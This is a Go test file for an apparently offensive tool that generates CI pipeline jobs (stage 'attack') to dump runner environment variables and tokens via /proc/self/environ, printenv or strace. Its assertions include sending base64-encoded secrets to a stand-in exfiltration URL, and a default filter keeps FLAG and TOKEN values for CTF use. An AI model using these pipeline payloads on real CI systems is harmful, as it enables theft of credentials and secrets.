package payloads

import (
	"strings"
	"testing"
)

func TestGenerateRunnerVarDumpYAML_PersistsArtifact(t *testing.T) {
	tests := []struct {
		name   string
		method string
		want   string
	}{
		{name: "procfs", method: "procfs", want: "/proc/self/environ"},
		{name: "printenv", method: "printenv", want: "printenv | sort"},
		{name: "strace", method: "strace", want: "strace -f"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rendered := GenerateRunnerVarDumpYAML(RunnerVarDumpOptions{Method: tt.method})
			for _, want := range []string{"stages: [attack]", tt.want, "> runner-vars.txt 2>&1", "paths:\n      - runner-vars.txt"} {
				if !strings.Contains(rendered, want) {
					t.Fatalf("generated payload missing %q:\n%s", want, rendered)
				}
			}
		})
	}
}

func TestGenerateRunnerVarDumpYAML_CallbackKeepsArtifact(t *testing.T) {
	rendered := GenerateRunnerVarDumpYAML(RunnerVarDumpOptions{CallbackURL: "https://callback.invalid"})
	for _, want := range []string{"base64 -w0 runner-vars.txt", "https://callback.invalid/exfil", "- runner-vars.txt"} {
		if !strings.Contains(rendered, want) {
			t.Fatalf("generated payload missing %q:\n%s", want, rendered)
		}
	}
}

func TestGenerateRunnerVarDumpYAML_DefaultFilterIncludesFlags(t *testing.T) {
	t.Parallel()

	rendered := GenerateRunnerVarDumpYAML(RunnerVarDumpOptions{})
	if !strings.Contains(rendered, `grep -iE 'FLAG|TOKEN`) {
		t.Fatalf("default filter does not retain CTF flags:\n%s", rendered)
	}
}
